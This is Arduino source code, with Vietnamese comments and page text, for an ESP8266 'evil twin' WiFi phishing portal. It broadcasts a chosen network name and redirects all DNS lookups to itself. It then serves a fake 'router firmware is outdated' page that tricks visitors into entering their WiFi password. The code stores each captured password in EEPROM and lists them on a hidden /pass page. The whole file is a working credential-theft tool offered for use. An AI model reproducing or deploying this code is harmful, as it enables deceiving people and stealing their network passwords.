// Cổng cố định WiFi ESP8266
// Bởi 125K (github.com/125K)
// Bản dịch bởi Đậu Đậu 5.0

// Thư viện
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Tên SSID mặc định
const char* SSID_NAME = "Đậu Đậu 5.0";

// Chuỗi chính mặc định
#define SUBTITLE "Thông tin bộ định tuyến."
#define TITLE "Cập nhật"
#define BODY "Phần sụn bộ định tuyến của bạn đã lỗi thời. Cập nhật chương trình cơ sở của bạn để tiếp tục duyệt web bình thường."
#define POST_TITLE "Đang cập nhật..."
#define POST_BODY "Bộ định tuyến của bạn đang được cập nhật. Vui lòng đợi cho đến khi quá trình kết thúc. </br> Cảm ơn bạn."
#define PASS_TITLE "Mật khẩu"
#define CLEAR_TITLE "Đã xóa"

// Init cài đặt hệ thống
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Cổng vào

String allPass = "";
String newSSID = "";
String currentSSID = "";

// Để lưu trữ mật khẩu trong EEPROM.
int initialCheckLocation = 20; // Vị trí để kiểm tra xem ESP có đang chạy lần đầu tiên hay không.
int passStart = 30;            // Vị trí bắt đầu trong EEPROM để lưu mật khẩu.
int passEnd = passStart;       // Vị trí kết thúc trong EEPROM để lưu mật khẩu.


unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { 
  return "</div><div class=q><a>&#169; Đã đăng ký Bản quyền.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>" + a + " :: " + t + "</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>" + CSS + "</style>"
    "<meta charset=\"UTF-8\"></head>"
    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h; }

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>Mật khẩu wifi:</label>"+
    "<input type=password name=m></input><input type=submit value=Start></form>" + footer();
}

String posted() {
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>"; // Thêm mật khẩu trong danh sách có thứ tự.
  allPass += pass;                       // Cập nhật mật khẩu đầy đủ.

  // Lưu trữ mật khẩu vào EEPROM.
  for (int i = 0; i <= pass.length(); ++i)
  {
    EEPROM.write(passEnd + i, pass[i]); // Thêm mật khẩu vào mật khẩu hiện có trong EEPROM.
  }

  passEnd += pass.length(); // Cập nhật vị trí cuối của mật khẩu trong EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Quay lại Index</a></p><p><a style=\"color:blue\" href=/clear>Xóa tất cả mật khẩu</a></p></center>" + footer();
}

String ssid() {
  return header("Change SSID") + "<p>Tại đây bạn có thể thay đổi tên SSID. Sau khi nhấn nút \"Change SSID\" bạn sẽ mất kết nối, vì vậy hãy kết nối lại với SSID mới.</p>" + "<form action=/postSSID method=post><label>Tên SSID mới:</label>"+
    "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID() {
  String postedSSID = input("s"); newSSID="<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
}

String clear() {
  allPass = "";
  passEnd = passStart; // Đặt vị trí kết thúc mật khẩu -> vị trí bắt đầu.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>Danh sách mật khẩu đã được đặt lại.</div></p><center><a style=\"color:blue\" href=/>Quay lại Index</a></center>" + footer();
}

void BLINK() { // Đèn LED tích hợp sẽ nhấp nháy 5 lần sau khi mật khẩu được đăng.
  for (int counter = 0; counter < 10; counter++)
  {
    // Để nhấp nháy đèn LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup() {
  // Bắt đầu nối tiếp
  Serial.begin(115200);
  
  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Kiểm tra xem ESP có đang chạy lần đầu tiên hay không.
  String checkValue = "first"; // Điều này sẽ được thiết lập trong EEPROM sau lần chạy đầu tiên.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Xóa vị trí SSID trong EEPROM.
      EEPROM.write(passStart, '\0'); // Xóa vị trí mật khẩu trong EEPROM
      EEPROM.commit();
      break;
    }
  }
  
  // Đọc SSID EEPROM
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

 // Đọc mật khẩu đã lưu và vị trí kết thúc của mật khẩu trong EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Đọc mật khẩu cửa hàng trong EEPROM.
    passEnd++;                             // Cập nhật vị trí cuối của mật khẩu trong EEPROM.
  }
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

 // Đặt currentSSID -> SSID trong EEPROM hoặc mặc định.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);  

// Khởi động máy chủ web
  dnsServer.start(DNS_PORT, "*", APIP); // Giả mạo DNS (Chỉ dành cho HTTP)
  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid",[]() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID",[]() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

// Bật đèn LED tích hợp
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}


void loop() { 
  if ((millis() - lastTick) > TICK_TIMER) {lastTick = millis();} 
dnsServer.processNextRequest(); webServer.handleClient(); }
